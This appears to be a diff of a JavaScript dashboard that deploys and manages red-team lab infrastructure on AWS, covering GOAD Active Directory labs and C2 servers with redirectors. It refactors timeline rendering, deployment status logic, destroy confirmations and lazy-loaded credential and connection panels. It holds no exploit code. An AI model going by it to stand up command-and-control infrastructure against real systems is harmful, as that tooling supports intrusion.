+        localStorage.setItem(getArchivedLogsKey(), JSON.stringify(archivedLogs));
     } catch (e) {
         console.error('Error saving archived logs:', e);
     }
@@ -7482,7 +13767,7 @@ async function loadDeploymentHistory() {
         
         if (data.success && data.history) {
             // Respect the "cleared at" timestamp — don't re-merge entries older than it
-            const clearedAt = localStorage.getItem('red_team_logs_cleared_at');
+            const clearedAt = localStorage.getItem(getClearedAtKey());
             const clearedTime = clearedAt ? new Date(clearedAt).getTime() : 0;
 
             // Merge server history with local logs AND archive
@@ -7530,22 +13815,41 @@ async function loadDeploymentHistory() {
 // Track expanded deployment sessions
 let expandedSessions = new Set();
 
+// Debounce timeline renders — multiple callers fire during page load and auto-refresh,
+// but only the last one per animation frame matters.
+let _timelineRenderRAF = null;
 function renderDeploymentTimeline() {
+    if (_timelineRenderRAF) cancelAnimationFrame(_timelineRenderRAF);
+    _timelineRenderRAF = requestAnimationFrame(_renderDeploymentTimelineNow);
+}
+
+function _renderDeploymentTimelineNow() {
+    _timelineRenderRAF = null;
     const timelineContent = document.getElementById('timeline-content');
     if (!timelineContent) return;
+
+    // Don't rebuild while a destroy is in progress — it would wipe the inline progress UI
+    if (window._destroyInProgress) return;
+
+    // Preserve open state of <details> elements inside expanded sessions.
+    // Without this, every re-render collapses user-opened sections (post-deploy
+    // checklist, connection info, credentials, etc.) — causing the "random collapse" bug.
+    const openDetails = new Set();
+    timelineContent.querySelectorAll('details[data-details-id][open]').forEach(el => {
+        openDetails.add(el.getAttribute('data-details-id'));
+    });
     
     // Filter out plan-only logs from the deployment timeline
     // Plan logs should only appear in the archived logs section
     const deploymentOnlyLogs = deploymentLogs.filter(log => log.entry_type !== 'plan');
     
-    // Get unique deployment sessions (group by date + project_name)
-    // This allows multiple deployments on the same day to be shown separately
+    // Get unique deployment sessions (group by project_name)
+    // All logs for the same project belong to one lifecycle (deploy → manage → destroy)
     const sessions = {};
     deploymentOnlyLogs.forEach(log => {
         const date = log.timestamp.split('T')[0];
-        // Use project_name from log if available, otherwise use date as fallback
         const projectName = log.project_name || null;
-        const sessionKey = projectName ? `${date}-${projectName}` : date;
+        const sessionKey = projectName || date;
         
         if (!sessions[sessionKey]) {
             sessions[sessionKey] = {
@@ -7641,12 +13945,23 @@ function renderDeploymentTimeline() {
             ))
         );
         
-        // Determine status - destroyed takes precedence over success
+        // Determine status based on final outcome (not just any error during the session)
+        // A successful retry after failures should show as Success
+        const lastSuccessIdx = s.logs.reduce((idx, log, i) =>
+            log.message && (log.message.includes('Deployment complete') || log.message.includes('Apply complete') || log.message.includes('Deployment Complete')) ? i : idx, -1);
+        const lastErrorIdx = s.logs.reduce((idx, log, i) =>
+            log.level === 'error' && !log.message.includes('cancelled') ? i : idx, -1);
+        const endedInSuccess = lastSuccessIdx > lastErrorIdx && lastSuccessIdx >= 0;
+
         let statusIcon, statusColor, statusText;
         if (wasDestroyed) {
             statusIcon = '🗑️';
             statusColor = 'var(--text-muted)';
             statusText = 'Destroyed';
+        } else if (endedInSuccess || (s.hasSuccess && !s.hasError)) {
+            statusIcon = '✅';
+            statusColor = 'var(--success-text)';
+            statusText = 'Success';
         } else if (s.hasError) {
             statusIcon = '❌';
             statusColor = 'var(--danger-text)';
@@ -7668,10 +13983,15 @@ function renderDeploymentTimeline() {
         const logCount = s.logs.length;
         const lastLog = s.logs[s.logs.length - 1];
         
-        // Format time range
+        // Format time range — handle sessions spanning multiple days
+        const startDate = s.firstTime ? s.firstTime.toISOString().split('T')[0] : s.date;
+        const endDate = s.lastTime ? s.lastTime.toISOString().split('T')[0] : s.date;
+        const spansMultipleDays = startDate !== endDate;
         const startTime = s.firstTime ? s.firstTime.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) : '';
         const endTime = s.lastTime ? s.lastTime.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) : '';
-        const timeRange = startTime === endTime ? startTime : `${startTime} - ${endTime}`;
+        const timeRange = spansMultipleDays
+            ? `${formatDate(startDate)} ${startTime} — ${formatDate(endDate)} ${endTime}`
+            : (startTime === endTime ? startTime : `${startTime} - ${endTime}`);
         
         // Calculate duration
         let duration = '';
@@ -7696,7 +14016,7 @@ function renderDeploymentTimeline() {
         
         // Show purge button for failed deployments (but not if already destroyed or unknown project)
         const purgeButton = (s.hasError && !wasDestroyed && hasValidProjectName) ? `
-            <button onclick="event.stopPropagation(); purgeFailedDeployment('${projectName}')" class="btn" style="background: var(--danger); color: white; font-size: 0.75em; padding: 6px 12px; margin-left: 10px;" title="Clean up ${projectResourceCount} resources from this failed deployment">
+            <button onclick="event.stopPropagation(); showDestroyConfirmation('${projectName}', 'purge')" class="btn" style="background: var(--danger); color: white; font-size: 0.75em; padding: 6px 12px; margin-left: 10px;" title="Clean up ${projectResourceCount} resources from this failed deployment">
                 🧹 Purge${resourceCountLabel}
             </button>
         ` : (s.hasError && !wasDestroyed && !hasValidProjectName) ? `
@@ -7717,7 +14037,6 @@ function renderDeploymentTimeline() {
                 <!-- Clickable Header -->
                 <div onclick="toggleSessionExpand('${sessionId}')" style="display: flex; align-items: center; gap: 15px; padding: 16px 20px; background: var(--bg-card); border-radius: ${isExpanded ? '8px 8px 0 0' : '8px'}; border-left: 5px solid ${statusColor}; cursor: pointer; transition: all 0.2s; box-shadow: 0 2px 4px rgba(0,0,0,0.05);" onmouseover="this.style.background='var(--bg-elevated)'; this.style.boxShadow='0 4px 8px rgba(0,0,0,0.2)'" onmouseout="this.style.background='var(--bg-card)'; this.style.boxShadow='0 2px 4px rgba(0,0,0,0.1)'">
                     <span style="font-size: 1em; transition: transform 0.2s; transform: rotate(${isExpanded ? '90deg' : '0deg'}); color: var(--text-secondary);">▶</span>
-                    <span style="font-size: 1.8em;">${statusIcon}</span>
                     <div style="flex: 1; min-width: 0;">
                         <div style="display: flex; align-items: center; flex-wrap: wrap; gap: 8px; margin-bottom: 6px;">
                             <span style="font-weight: 700; color: var(--text-primary); font-size: 1.1em;">${projectName}</span>
@@ -7725,7 +14044,7 @@ function renderDeploymentTimeline() {
                             <span style="background: ${statusColor}15; color: ${statusColor}; padding: 3px 10px; border-radius: 4px; font-size: 0.75em; font-weight: 600; text-transform: uppercase;">${statusText}</span>
                         </div>
                         <div style="display: flex; align-items: center; gap: 12px; color: var(--text-secondary); font-size: 0.88em;">
-                            <span>📅 ${formatDate(s.date)}</span>
+                            ${spansMultipleDays ? '' : `<span>📅 ${formatDate(s.date)}</span>`}
                             <span>🕐 ${timeRange}</span>
                             <span>⏱️ ${duration || 'N/A'}</span>
                             <span>📊 ${logCount} events</span>
@@ -7744,6 +14063,21 @@ function renderDeploymentTimeline() {
             </div>
         `;
     }).join('');
+
+    // Restore open state of <details> elements that were open before re-render
+    if (openDetails.size > 0) {
+        timelineContent.querySelectorAll('details[data-details-id]').forEach(el => {
+            if (openDetails.has(el.getAttribute('data-details-id'))) {
+                el.open = true;
+            }
+        });
+    }
+
+    // Auto-load SSL status if the section was just rendered and needs data
+    const sslDiv = document.getElementById('ssl-status-content');
+    if (sslDiv && sslDiv.hasAttribute('data-needs-load')) {
+        setTimeout(() => autoLoadSSLStatus(), 0);
+    }
 }
 
 /**
@@ -7843,12 +14177,12 @@ function buildSessionDetails(session, sessionId) {
     const errorSection = errorLogs.length > 0 ? `
         <div style="margin-top: 15px;">
             <div style="font-weight: 600; color: var(--danger-text); margin-bottom: 8px; font-size: 0.9em;">⚠️ Errors (${errorLogs.length})</div>
-            <div style="background: var(--bg-terminal); color: var(--danger-text); padding: 12px; border-radius: 6px; font-family: monospace; font-size: 0.8em; max-height: 150px; overflow-y: auto;">
+            <div class="terminal-block" style="font-size: 0.8em; max-height: 150px; overflow-y: auto;">
                 ${errorLogs.map(log => {
                     const time = new Date(log.timestamp).toLocaleTimeString();
                     // Clean ANSI codes from message
                     const cleanMsg = log.message.replace(/\x1b\[[0-9;]*m/g, '').substring(0, 200);
-                    return `<div style="margin-bottom: 6px;"><span style="color: var(--text-muted);">[${time}]</span> ${cleanMsg}</div>`;
+                    return `<div style="margin-bottom: 6px;"><span style="color: #7A849E;">[${time}]</span> ${cleanMsg}</div>`;
                 }).join('')}
             </div>
         </div>
@@ -7868,67 +14202,69 @@ function buildSessionDetails(session, sessionId) {
     // Project name for fetching actual resources
     const projectName = session.projectName || '';
     
-    // Only show management buttons for successful deployments
-    const isSuccess = session.hasSuccess && !session.hasError;
+    // Determine if deployment ended successfully (same logic as header badge)
+    // A deployment with errors can still be successful if the last success came after the last error
+    const lastSuccessIdx = session.logs.reduce((idx, log, i) =>
+        log.message && (log.message.includes('Deployment complete') || log.message.includes('Apply complete') || log.message.includes('Deployment Complete')) ? i : idx, -1);
+    const lastErrorIdx = session.logs.reduce((idx, log, i) =>
+        log.level === 'error' && !log.message.includes('cancelled') ? i : idx, -1);
+    const endedInSuccess = lastSuccessIdx > lastErrorIdx && lastSuccessIdx >= 0;
+    const isSuccess = endedInSuccess || (session.hasSuccess && !session.hasError);
     const managementButtons = isSuccess ? `
         <div style="background: var(--bg-card); padding: 15px; border-radius: 8px; margin-bottom: 15px; border: 1px solid var(--border);">
             <div style="font-weight: 600; color: var(--text-primary); margin-bottom: 12px; font-size: 0.95em;">⚙️ Deployment Management</div>
             <div style="display: flex; gap: 10px; flex-wrap: wrap;">
-                <button onclick="stopDeploymentResources('${projectName}')" class="btn" style="background: var(--warning); color: var(--text-primary); font-size: 0.88em; padding: 8px 16px;">
+                <button onclick="stopDeploymentResources('${projectName}')" class="btn" style="background: var(--warning); color: white; font-size: 0.88em; padding: 8px 16px;">
                     ⏸️ Stop EC2 Instances
                 </button>
-                <button onclick="startDeploymentResources('${projectName}')" class="btn" style="background: var(--success); color: var(--text-primary); font-size: 0.88em; padding: 8px 16px;">
+                <button onclick="startDeploymentResources('${projectName}')" class="btn" style="background: var(--success); color: white; font-size: 0.88em; padding: 8px 16px;">
                     ▶️ Start EC2 Instances
                 </button>
-                <button onclick="destroyDeployment('${projectName}')" class="btn" style="background: var(--danger); color: var(--text-primary); font-size: 0.88em; padding: 8px 16px;">
+                <button id="destroy-btn-${projectName}" onclick="showDestroyConfirmation('${projectName}', 'destroy')" class="btn" style="background: var(--danger); color: white; font-size: 0.88em; padding: 8px 16px;">
                     🗑️ Destroy Infrastructure
                 </button>
             </div>
             <div style="margin-top: 10px; font-size: 0.8em; color: var(--text-secondary); background: var(--warning-bg); padding: 8px 12px; border-radius: 4px; border-left: 3px solid var(--warning);">
                 ⚠️ <strong>Note:</strong> Stop/Start only affects EC2 instances. Other resources (VPC, S3, NAT Gateway, etc.) remain active and may still incur charges.
             </div>
+            <div id="destroy-confirm-${projectName}" style="display: none;"></div>
         </div>
     ` : '';
     
-    // Connection info section for successful deployments
-    const connectionSection = isSuccess ? `
-        <div id="${sessionId}-connection" style="background: var(--bg-card); padding: 15px; border-radius: 8px; margin-bottom: 15px; border: 1px solid var(--border);">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
-                <div style="font-weight: 600; color: var(--text-primary); font-size: 0.95em;">🔗 Connection Info</div>
-                <button onclick="loadConnectionInfo('${projectName}', '${sessionId}')" class="btn btn-secondary" style="font-size: 0.75em; padding: 4px 10px;">
-                    🔄 Load Connection Details
-                </button>
-            </div>
-            <div id="${sessionId}-connection-content" style="color: var(--text-secondary); font-size: 0.9em;">
-                Click "Load Connection Details" to fetch SSH commands and access information
-            </div>
-        </div>
-    ` : '';
-    
-    // Credentials section for successful deployments
-    const credentialsSection = isSuccess ? `
-        <div id="${sessionId}-credentials" style="background: var(--bg-card); padding: 15px; border-radius: 8px; margin-bottom: 15px; border: 1px solid var(--border);">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
-                <div style="font-weight: 600; color: var(--text-primary); font-size: 0.95em;">🔐 Credentials</div>
-                <button onclick="loadCredentials('${projectName}', '${sessionId}')" class="btn btn-secondary" style="font-size: 0.75em; padding: 4px 10px;">
-                    🔄 Load Credentials
-                </button>
-            </div>
-            <div id="${sessionId}-credentials-content" style="color: var(--text-secondary); font-size: 0.9em;">
-                Click "Load Credentials" to fetch GOAD lab credentials and access details
-            </div>
-        </div>
-    ` : '';
-    
-    // GOAD Provisioning Instructions (for GOAD deployments)
-    // Use deployment type from session data for reliable detection
+    // Detect deployment type (used for connection info, credentials, and provisioning sections)
     const sessionDeployType = session?.deploymentType || '';
+    const isC2Deployment = sessionDeployType.startsWith('c2-') ||
+                           sessionDeployType.startsWith('combined-');
     const isGoadDeployment = sessionDeployType.startsWith('goad-') ||
                              sessionDeployType.startsWith('combined-') ||
                              sessionDeployType.includes('goad') ||
                              sessionDeployType.includes('sccm') ||
                              sessionDeployType.includes('nha');
+
+    // Connection info section for successful deployments (collapsible, lazy-loaded per-project)
+    const connectionSection = isSuccess ? `
+        <details class="details-card" data-details-id="${sessionId}-connection"
+                 ontoggle="if(this.open){loadConnectionInfo('${projectName}','${sessionId}')}">
+            <summary>Connection Info</summary>
+            <div id="${sessionId}-connection-content">Loading connection details...</div>
+        </details>
+    ` : '';
+
+    // Credentials section
+    // C2 deployments: handled by Post-Deployment Checklist (license + password steps)
+    // GOAD deployments: lazy-load GOAD credentials from API
+    let credentialsSection = '';
+    if (isSuccess && isGoadDeployment) {
+        credentialsSection = `
+        <details class="details-card" data-details-id="${sessionId}-credentials" ontoggle="if(this.open){loadCredentials('${projectName}','${sessionId}')}">
+            <summary>GOAD Credentials</summary>
+            <div id="${sessionId}-credentials-content">
+                Loading credentials...
+            </div>
+        </details>`;
+    }
     
+    // GOAD Provisioning Instructions (for GOAD deployments)
     const goadProvisioningSection = (isSuccess && isGoadDeployment) ? `
         <div style="background: var(--warning-bg); padding: 20px; border-radius: 8px; margin-bottom: 15px; border: 2px solid var(--warning);">
             <div style="font-weight: 700; color: var(--warning-text); margin-bottom: 15px; font-size: 1.1em; display: flex; align-items: center; gap: 8px;">
@@ -7968,7 +14304,7 @@ function buildSessionDetails(session, sessionId) {
 
             <!-- Provisioning Status Area (hidden initially) -->
             <div id="${sessionId}-provision-status" style="display: none; margin-bottom: 15px;">
-                <div style="background: var(--bg-terminal); border-radius: 6px; padding: 15px;">
+                <div class="terminal-block" style="padding: 15px;">
                     <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
                         <div class="spinner" style="width: 18px; height: 18px; border: 2px solid var(--border); border-top: 2px solid var(--warning); border-radius: 50%; animation: spin 1s linear infinite;"></div>
                         <span id="${sessionId}-provision-msg" style="color: var(--warning-text); font-weight: 600;">Starting AD provisioning...</span>
@@ -7979,15 +14315,15 @@ function buildSessionDetails(session, sessionId) {
             </div>
 
             <!-- Manual Alternative (collapsible) -->
-            <details style="margin-bottom: 15px;">
+            <details style="margin-bottom: 15px;" data-details-id="${sessionId}-manual-ansible">
                 <summary style="cursor: pointer; color: var(--text-secondary); font-size: 0.88em; font-weight: 500;">📋 Manual Alternative: Run Ansible from Jumpbox</summary>
-                <div style="background: var(--bg-terminal); border-radius: 6px; overflow: hidden; margin-top: 10px;">
+                <div class="terminal-block" style="padding: 0; overflow: hidden; margin-top: 10px;">
                     <div style="padding: 12px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.88em; color: var(--text-secondary); line-height: 1.6;">
-                        <div style="color: var(--text-muted);"># SSH to jumpbox</div>
-                        <div style="color: var(--accent-muted);">ssh -i ~/.ssh/goad_key ubuntu@&lt;JUMPBOX_IP&gt;</div>
+                        <div class="t-muted"># SSH to jumpbox</div>
+                        <div class="t-terminal">ssh -i ~/.ssh/goad_key ubuntu@&lt;JUMPBOX_IP&gt;</div>
                         <div style="color: var(--text-muted); margin-top: 8px;"># Run GOAD Ansible provisioning (pre-installed on jumpbox)</div>
-                        <div style="color: var(--accent-muted);">cd /home/ubuntu/GOAD</div>
-                        <div style="color: var(--accent-muted);">ansible-playbook -i ad/&lt;LAB_TYPE&gt;/data/inventory -i ad/&lt;LAB_TYPE&gt;/providers/aws/inventory ansible/main.yml</div>
+                        <div class="t-terminal">cd /home/ubuntu/GOAD</div>
+                        <div class="t-terminal">ansible-playbook -i ad/&lt;LAB_TYPE&gt;/data/inventory -i ad/&lt;LAB_TYPE&gt;/providers/aws/inventory ansible/main.yml</div>
                     </div>
                 </div>
             </details>
@@ -8003,14 +14339,16 @@ function buildSessionDetails(session, sessionId) {
                 </ul>
             </div>
 
-            <div style="margin-top: 15px; padding: 10px; background: var(--info-bg); border-radius: 6px; font-size: 0.8em; color: var(--info-text);">
-                💡 <strong>Tip:</strong> See the official <a href="https://orange-cyberdefense.github.io/GOAD/providers/aws/" target="_blank" style="color: var(--info-text);">GOAD AWS Documentation</a> for detailed provisioning instructions.
+            <div class="alert-box alert-box--info" style="margin-top: 15px; font-size: 0.8em;">
+                💡 <strong>Tip:</strong> See the official <a href="https://orange-cyberdefense.github.io/GOAD/providers/aws/" target="_blank" class="t-info">GOAD AWS Documentation</a> for detailed provisioning instructions.
             </div>
         </div>
     ` : '';
 
     return `
         <div id="${sessionId}-details" style="background: var(--bg-container); border: 1px solid var(--border); border-top: none; border-radius: 0 0 8px 8px; padding: 20px;">
+            <!-- Inline Destroy/Purge Confirmation (for failed deployments without management section) -->
+            ${!isSuccess ? `<div id="destroy-confirm-${projectName}" style="display: none;"></div>` : ''}
             <!-- Summary Stats -->
             <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px;">
                 <div style="background: var(--bg-card); padding: 12px; border-radius: 8px; text-align: center; border: 1px solid var(--border);">
@@ -8038,10 +14376,10 @@ function buildSessionDetails(session, sessionId) {
             <div style="background: var(--bg-card); padding: 15px; border-radius: 8px; margin-bottom: 15px; border: 1px solid var(--border);">
                 <div style="font-weight: 600; color: var(--text-primary); margin-bottom: 12px; font-size: 0.95em;">📋 Deployment Details</div>
                 <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; font-size: 0.88em;">
-                    <div><span style="color: var(--text-secondary);">Project:</span> <strong>${session.projectName || 'Unknown'}</strong></div>
-                    <div><span style="color: var(--text-secondary);">Date:</span> <strong>${formatDate(session.date)}</strong></div>
-                    <div><span style="color: var(--text-secondary);">Started:</span> <strong>${session.firstTime ? session.firstTime.toLocaleTimeString() : 'N/A'}</strong></div>
-                    <div><span style="color: var(--text-secondary);">Ended:</span> <strong>${session.lastTime ? session.lastTime.toLocaleTimeString() : 'N/A'}</strong></div>
+                    <div><span class="t-secondary">Project:</span> <strong>${session.projectName || 'Unknown'}</strong></div>
+                    <div><span class="t-secondary">Date:</span> <strong>${formatDate(session.date)}</strong></div>
+                    <div><span class="t-secondary">Started:</span> <strong>${session.firstTime ? session.firstTime.toLocaleTimeString() : 'N/A'}</strong></div>
+                    <div><span class="t-secondary">Ended:</span> <strong>${session.lastTime ? session.lastTime.toLocaleTimeString() : 'N/A'}</strong></div>
                 </div>
             </div>
             
@@ -8050,10 +14388,52 @@ function buildSessionDetails(session, sessionId) {
             
             <!-- Credentials (for successful deployments) -->
             ${credentialsSection}
-            
+
+            <!-- Post-Deployment Checklist (for C2 deployments) -->
+            ${isSuccess && isC2Deployment ? `
+                <details class="details-card" data-details-id="${sessionId}-checklist"
+                         ontoggle="if(this.open){loadPostDeployChecklist('${projectName}','${sessionId}')}">
+                    <summary style="font-weight: 600;">Post-Deployment Checklist</summary>
+                    <div id="${sessionId}-checklist-content">Loading checklist...</div>
+                </details>
+            ` : ''}
+
+            <!-- SSL & DNS Status (for C2 deployments with redirectors) -->
+            ${isSuccess && isC2Deployment ? `
+            <details class="details-card" data-details-id="${sessionId}-ssl-dns">
+                <summary style="font-weight: 600;">SSL & DNS Status <span id="ssl-last-refreshed" style="font-weight: 400; margin-left: 8px; font-size: 0.78em; color: var(--text-muted);"></span></summary>
+                <div>
+                    <div style="display: flex; justify-content: flex-end; margin-bottom: 10px;">
+                        <button onclick="refreshSSLStatus()" class="btn btn-secondary" style="font-size: 0.75em; padding: 4px 10px;">
+                            Refresh
+                        </button>
+                    </div>
+                    <div id="ssl-status-content" data-needs-load="true" style="color: var(--text-secondary); font-size: 0.9em;">
+                    </div>
+                </div>
+            </details>
+            ` : ''}
+
+            <!-- Host Setup Status (checks bootstrap script completion via SSM) -->
+            ${isSuccess ? `
+            <details class="details-card" data-details-id="${sessionId}-setup-check">
+                <summary style="font-weight: 600;">Host Setup Status <span id="setup-check-badge" style="font-weight: 400; margin-left: 8px; font-size: 0.78em;"></span><span id="setup-check-last-checked" style="font-weight: 400; margin-left: 8px; font-size: 0.78em; color: var(--text-muted);"></span></summary>
+                <div>
+                    <div style="display: flex; justify-content: flex-end; margin-bottom: 10px;">
+                        <button onclick="runSetupCheck()" id="setup-check-btn" class="btn btn-secondary" style="font-size: 0.75em; padding: 4px 10px;">
+                            Check Setup
+                        </button>
+                    </div>
+                    <div id="setup-check-content" style="color: var(--text-secondary); font-size: 0.9em;">
+                        <p style="color: var(--text-muted); font-style: italic;">No setup check results yet. Click "Check Setup" or wait for the automatic check after deployment.</p>
+                    </div>
+                </div>
+            </details>
+            ` : ''}
+
             <!-- GOAD Provisioning Instructions (for GOAD deployments) -->
             ${goadProvisioningSection}
-            
+
             <!-- AWS Resources Section (loaded dynamically) -->
             <div id="${sessionId}-resources" style="background: var(--bg-card); padding: 15px; border-radius: 8px; margin-bottom: 15px; border: 1px solid var(--border);">
                 <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
@@ -8071,10 +14451,10 @@ function buildSessionDetails(session, sessionId) {
             ${purgedSection}
             
             <!-- Phase Timeline -->
-            <div style="background: var(--bg-card); padding: 15px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 15px;">
-                <div style="font-weight: 600; color: var(--text-primary); margin-bottom: 12px; font-size: 0.95em;">📊 Deployment Phases</div>
-                ${phaseHtml}
-            </div>
+            <details style="background: var(--bg-card); padding: 15px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 15px;" data-details-id="${sessionId}-phases">
+                <summary style="font-weight: 600; color: var(--text-primary); font-size: 0.95em; cursor: pointer; user-select: none;">📊 Deployment Phases</summary>
+                <div style="margin-top: 12px;">${phaseHtml}</div>
+            </details>
             
             ${errorSection}
             
@@ -8190,7 +14570,7 @@ async function loadProjectResources(projectName, sessionId) {
     if (!contentDiv) return;
     
     if (!projectName) {
-        contentDiv.innerHTML = '<span style="color: var(--danger-text);">❌ No project name available</span>';
+        contentDiv.innerHTML = '<span class="t-danger">❌ No project name available</span>';
         return;
     }
     
@@ -8201,12 +14581,12 @@ async function loadProjectResources(projectName, sessionId) {
         const data = await response.json();
         
         if (!data.success) {
-            contentDiv.innerHTML = `<span style="color: var(--danger-text);">❌ ${data.error || 'Failed to load resources'}</span>`;
+            contentDiv.innerHTML = `<span class="t-danger">❌ ${data.error || 'Failed to load resources'}</span>`;
             return;
         }
         
         if (!data.resources || data.resources.length === 0) {
-            contentDiv.innerHTML = '<span style="color: var(--text-secondary);">No resources found for this project</span>';
+            contentDiv.innerHTML = '<span class="t-secondary">No resources found for this project</span>';
             return;
         }
         
@@ -8214,7 +14594,7 @@ async function loadProjectResources(projectName, sessionId) {
         contentDiv.innerHTML = buildProjectResourcesHTML(data);
         
     } catch (error) {
-        contentDiv.innerHTML = `<span style="color: var(--danger-text);">❌ Error: ${error.message}</span>`;
+        contentDiv.innerHTML = `<span class="t-danger">❌ Error: ${error.message}</span>`;
     }
 }
 
@@ -8228,21 +14608,21 @@ function buildProjectResourcesHTML(data) {
     const resources = data.resources;
     const grouped = data.resources_grouped || {};
     
-    // Resource type icons and labels
+    // Resource type labels (icons come from centralized awsIcon())
     const typeConfig = {
-        'ec2': { icon: '🖥️', label: 'EC2 Instances' },
-        'vpc': { icon: '🌐', label: 'VPCs' },
-        'subnet': { icon: '📦', label: 'Subnets' },
-        'security_group': { icon: '🔒', label: 'Security Groups' },
-        'nat_gateway': { icon: '🚪', label: 'NAT Gateways' },
-        'elastic_ip': { icon: '📍', label: 'Elastic IPs' },
-        's3_bucket': { icon: '🪣', label: 'S3 Buckets' },
-        'internet_gateway': { icon: '🌍', label: 'Internet Gateways' },
-        'route_table': { icon: '🛣️', label: 'Route Tables' },
-        'key_pair': { icon: '🔑', label: 'Key Pairs' },
-        'network_interface': { icon: '🔌', label: 'Network Interfaces' },
-        'iam_role': { icon: '👤', label: 'IAM Roles' },
-        'iam_instance_profile': { icon: '🎭', label: 'IAM Instance Profiles' }
+        'ec2': { label: 'EC2 Instances' },
+        'vpc': { label: 'VPCs' },
+        'subnet': { label: 'Subnets' },
+        'security_group': { label: 'Security Groups' },
+        'nat_gateway': { label: 'NAT Gateways' },
+        'elastic_ip': { label: 'Elastic IPs' },
+        's3_bucket': { label: 'S3 Buckets' },
+        'internet_gateway': { label: 'Internet Gateways' },
+        'route_table': { label: 'Route Tables' },
+        'key_pair': { label: 'Key Pairs' },
+        'network_interface': { label: 'Network Interfaces' },
+        'iam_role': { label: 'IAM Roles' },
+        'iam_instance_profile': { label: 'IAM Instance Profiles' }
     };
     
     // State colors
@@ -8259,8 +14639,8 @@ function buildProjectResourcesHTML(data) {
     };
     
     let html = `
-        <div style="margin-bottom: 10px; font-size: 0.88em; color: var(--text-secondary);">
-            <strong>${resources.length}</strong> resources • 
+        <div style="margin-bottom: 10px; font-size: 0.92em; color: var(--text-secondary);">
+            <strong>${resources.length}</strong> resources •
             Deployed: ${data.deployed_at ? new Date(data.deployed_at).toLocaleString() : 'Unknown'} •
             Region: ${data.region || 'Unknown'}
         </div>
@@ -8273,23 +14653,23 @@ function buildProjectResourcesHTML(data) {
         const typeResources = grouped[type];
         if (!typeResources || typeResources.length === 0) continue;
         
-        const config = typeConfig[type] || { icon: '📦', label: type };
-        
+        const config = typeConfig[type] || { label: type };
+
         html += `
             <div style="margin-bottom: 15px;">
-                <div style="font-weight: 500; color: var(--text-primary); margin-bottom: 8px; font-size: 0.9em;">
-                    ${config.icon} ${config.label} (${typeResources.length})
+                <div style="font-weight: 500; color: var(--text-primary); margin-bottom: 8px; font-size: 0.95em; display: flex; align-items: center; gap: 6px;">
+                    ${awsIcon(type, 20)} ${config.label} (${typeResources.length})
                 </div>
                 <div style="display: flex; flex-direction: column; gap: 6px;">
         `;
-        
+
         for (const resource of typeResources) {
             const stateColor = stateColors[resource.state] || 'var(--text-muted)';
-            const stateIcon = resource.state === 'running' ? '🟢' : 
-                             resource.state === 'stopped' ? '🟠' : 
+            const stateIcon = resource.state === 'running' ? '🟢' :
+                             resource.state === 'stopped' ? '🟠' :
                              resource.state === 'terminated' ? '🔴' :
                              resource.state === 'available' || resource.state === 'active' ? '🟢' : '⚪';
-            
+
             // Build details string
             let details = [];
             if (resource.role) details.push(resource.role);
@@ -8301,27 +14681,43 @@ function buildProjectResourcesHTML(data) {
             if (resource.key_type) details.push(`Type: ${resource.key_type}`);
             if (resource.route_count) details.push(`${resource.route_count} routes`);
             if (resource.role_count) details.push(`${resource.role_count} roles`);
-            
+
             html += `
-                <div style="display: flex; align-items: center; gap: 10px; padding: 8px 12px; background: var(--bg-container); border-radius: 6px; font-size: 0.88em;">
+                <div style="display: flex; align-items: center; gap: 10px; padding: 10px 14px; background: var(--bg-container); border-radius: 6px; font-size: 0.95em;">
                     <span>${stateIcon}</span>
                     <div style="flex: 1; min-width: 0;">
                         <div style="font-weight: 500; color: var(--text-primary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
                             ${resource.name || resource.id}
                         </div>
-                        <div style="font-size: 0.88em; color: var(--text-muted); font-family: monospace;">
+                        <div style="font-size: 0.9em; color: var(--text-muted); font-family: monospace;">
                             ${resource.id}
                         </div>
                         ${details.length > 0 ? `
-                            <div style="font-size: 0.8em; color: var(--text-secondary); margin-top: 2px;">
+                            <div style="font-size: 0.88em; color: var(--text-secondary); margin-top: 2px;">
                                 ${details.join(' • ')}
                             </div>
                         ` : ''}
                     </div>
-                    <span style="font-size: 0.75em; padding: 2px 8px; border-radius: 4px; background: ${stateColor}20; color: ${stateColor}; font-weight: 500; text-transform: uppercase;">
+                    <span style="font-size: 0.82em; padding: 3px 10px; border-radius: 4px; background: ${stateColor}20; color: ${stateColor}; font-weight: 500; text-transform: uppercase;">
                         ${resource.state}
                     </span>
                 </div>
+                ${resource.objects && resource.objects.length > 0 ? `
+                <div style="margin-left: 30px; margin-top: 4px; padding: 8px 12px; background: var(--bg-elevated); border-radius: 4px; font-size: 0.88em;">
+                    <div style="color: var(--text-muted); margin-bottom: 6px; font-weight: 500;">📁 Bucket Contents (${resource.object_count || resource.objects.length}${resource.is_truncated ? '+' : ''}):</div>
+                    ${resource.objects.map(obj => `
+                        <div style="display: flex; justify-content: space-between; align-items: center; padding: 3px 0; border-bottom: 1px solid var(--border-light);">
+                            <span style="color: var(--text-primary); font-family: monospace; font-size: 0.92em; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex: 1;">${obj.key}</span>
+                            <span style="color: var(--text-muted); font-size: 0.88em; margin-left: 12px; white-space: nowrap;">${obj.size}</span>
+                        </div>
+                    `).join('')}
+                    ${resource.is_truncated ? `<div style="color: var(--text-muted); font-style: italic; margin-top: 4px;">...and more files</div>` : ''}
+                </div>
+                ` : resource.type === 's3_bucket' ? `
+                <div style="margin-left: 30px; margin-top: 4px; padding: 6px 12px; background: var(--bg-elevated); border-radius: 4px; font-size: 0.88em; color: var(--text-muted);">
+                    📁 Bucket is empty
+                </div>
+                ` : ''}
             `;
         }
         
@@ -8338,12 +14734,12 @@ function buildProjectResourcesHTML(data) {
         const typeResources = grouped[type];
         if (!typeResources || typeResources.length === 0) continue;
         
-        const config = typeConfig[type] || { icon: '📦', label: type };
-        
+        const config = typeConfig[type] || { label: type };
+
         html += `
             <div style="margin-bottom: 15px;">
